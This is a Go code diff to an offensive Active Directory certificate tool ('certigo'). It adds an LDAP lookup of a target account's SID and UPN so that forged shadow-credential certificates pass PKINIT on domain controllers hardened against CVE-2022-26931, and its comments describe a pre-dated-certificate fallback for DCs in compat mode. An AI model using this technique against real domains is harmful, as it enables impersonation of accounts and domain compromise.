@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"strings"
 
+	goldap "github.com/go-ldap/ldap/v3"
 	"github.com/spf13/cobra"
 
 	"github.com/ajm4n/certigo/internal/auth"
@@ -100,11 +101,20 @@ func runShadow(f *shadowFlags) error {
 		}
 	}
 
+	// Best-effort SID + UPN lookup so the generated shadow cert carries
+	// szOID_NTDS_CA_SECURITY_EXT and a SAN UPN — required for PKINIT
+	// to succeed on KB5014754-strict DCs (CVE-2022-26931). Failure is
+	// non-fatal; the cert is still pre-dated to 2018, which works on
+	// DCs in compat mode.
+	tsid, tupn := lookupShadowIdentities(conn, targetDN)
+
 	opts := shadow.Options{
-		Conn:     conn,
-		TargetDN: targetDN,
-		OutPFX:   f.outPFX,
-		PFXPass:  f.pfxPass,
+		Conn:      conn,
+		TargetDN:  targetDN,
+		OutPFX:    f.outPFX,
+		PFXPass:   f.pfxPass,
+		TargetSID: tsid,
+		TargetUPN: tupn,
 	}
 
 	switch strings.ToLower(f.action) {
@@ -157,4 +167,51 @@ func runShadow(f *shadowFlags) error {
 
 func resolveAccountDN(conn any, baseDN, samAccountName string) (string, error) {
 	return "", fmt.Errorf("resolveAccountDN: not implemented (pass --target-dn directly)")
+}
+
+// lookupShadowIdentities pulls objectSid (canonical S-1-5-21-... form)
+// and userPrincipalName for the principal at targetDN. Both are
+// best-effort: on lookup failure, empty strings are returned and
+// writeSelfSignedPFX falls back to the legacy pre-dated-cert path
+// which still works on KDCs in compat mode (the post-KB5014754
+// default).
+func lookupShadowIdentities(conn *goldap.Conn, targetDN string) (sid, upn string) {
+	if conn == nil || targetDN == "" {
+		return "", ""
+	}
+	req := goldap.NewSearchRequest(targetDN,
+		goldap.ScopeBaseObject, goldap.NeverDerefAliases,
+		0, 5, false, "(objectClass=*)",
+		[]string{"objectSid", "userPrincipalName"}, nil)
+	res, err := conn.Search(req)
+	if err != nil || len(res.Entries) == 0 {
+		return "", ""
+	}
+	e := res.Entries[0]
+	if raw := e.GetRawAttributeValue("objectSid"); len(raw) > 0 {
+		sid = sidBytesToString(raw)
+	}
+	if v := e.GetAttributeValue("userPrincipalName"); v != "" {
+		upn = v
+	}
+	return sid, upn
+}
+
+// sidBytesToString decodes a Windows SID binary into the canonical
+// "S-1-5-21-..." string form. Mirrors the encoder used elsewhere in
+// the umber/certigo trees.
+func sidBytesToString(b []byte) string {
+	if len(b) < 8 {
+		return ""
+	}
+	rev := b[0]
+	subCount := int(b[1])
+	auth := uint64(b[2])<<40 | uint64(b[3])<<32 | uint64(b[4])<<24 | uint64(b[5])<<16 | uint64(b[6])<<8 | uint64(b[7])
+	out := fmt.Sprintf("S-%d-%d", rev, auth)
+	for i := 0; i < subCount && 8+4*(i+1) <= len(b); i++ {
+		off := 8 + 4*i
+		sub := uint32(b[off]) | uint32(b[off+1])<<8 | uint32(b[off+2])<<16 | uint32(b[off+3])<<24
+		out += fmt.Sprintf("-%d", sub)
+	}
+	return out
 }
